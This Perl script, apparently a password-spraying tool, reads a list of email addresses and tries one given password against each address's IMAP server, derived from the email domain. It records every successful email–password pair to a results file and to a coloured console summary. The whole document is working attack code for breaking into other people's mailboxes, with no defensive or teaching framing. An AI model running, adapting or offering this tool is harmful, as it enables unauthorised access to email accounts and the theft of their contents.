#!/usr/bin/perl

#./check_IMAP_one.pl --file email.txt --password 123456

use strict;
use warnings;
use Getopt::Long;
use locale;
use Mail::IMAPClient;
use Term::ANSIColor;
use Curses;

$SIG{INT} = \&ctrl_c;

my $file;
my $password;
my $count_all_emails = 0;
my $count_success_emails = 0;
my $count_error_emails = 0;
my $count_hosts = 0;

GetOptions ("file=s" => \$file, "password=s"   => \$password) or die("Error in command line arguments\n");

&main;

#====================================================================
sub main
{
    open my $file, "<", "$file" or die "Can't open file: $!\n";

    system("clear");

    while(<$file>)
    {
	chomp $_;
	lc $_;
	if ($_ ne "")
	{
	    my $check_result;
	    $check_result = &check_imap($_);

	    if ($check_result == 1)
	    {
		&write_result_to_console("email: $_, password: $password - SUCCESS\r\n", "green");
		&write_result_to_file("email: $_, password: $password - SUCCESS\r\n", 1);
		$count_success_emails++;
	    }
	    else
	    {
		&write_result_to_console("email: $_, password: $password - ERROR\r\n", "red");
		&write_result_to_file("email: $_, password: $password - ERROR\r\n", -1);
		$count_error_emails++;
	    }
	    $count_all_emails++;
	}
    }

    &write_result_to_console("=== DONE ===\r\n", "yellow");
    &write_result_to_console("TOTAL: $count_all_emails\r\n", "white");
    &write_result_to_console("SUCCESS: $count_success_emails\r\n", "green");
    &write_result_to_console("ERROR: $count_error_emails\r\n", "red");
    #&the_end();
}

#====================================================================
sub ctrl_c
{
    print color("reset");

    exit(0);
}

#====================================================================
sub check_imap
{
    my ($email) = @_;
    my $host = &get_host($email);

    my $imap = Mail::IMAPClient->new;

    $imap = Mail::IMAPClient->new(
                        Server => $host,
                        User    => $email,
                        Password=> $password,
                        Clear   => 5,
			Timeout => 5,
        ) or die return -1;

    $imap->Unconnected();

    return 1;
}

#====================================================================
sub get_host
{
    my ($message) = @_;

    my $result;

    if ($message =~ m/(?<=@)([a-zA-Z0-9_\.-]+)\.([a-zA-Z\.]{2,6})/s)
    {
        $result = $&;
    }
    else
    {
        $result = "";
    }

    return $result;
}

#====================================================================
sub write_result_to_file
{
    my ($log, $type) = @_;

    my $fh;

    if ($type == 1)
    {
	open($fh, '>>', "result_SUCCESS.txt");
    }
    elsif($type == -1)
    {
	open($fh, '>>', "result_ERROR.txt");
    }

    print $fh $log;

    close $fh;
}

#====================================================================
sub write_result_to_console
{
    my ($log, $color) = @_;

    print color($color);
    print "$log";
    print color("reset");
}

#===================================================================
sub the_end
{
    my $win = Curses->new();

    raw();

    noecho();

    $win->keypad(1);

    $win->getmaxyx(my $row, my $col);

    my $str = "Your terminal size: ${row}x$col";

    $win->addstr( $row/2, ( $col - length $str )/2 , $str );

    $win->refresh();

    my $ch = $win->getch();

    endwin();
}
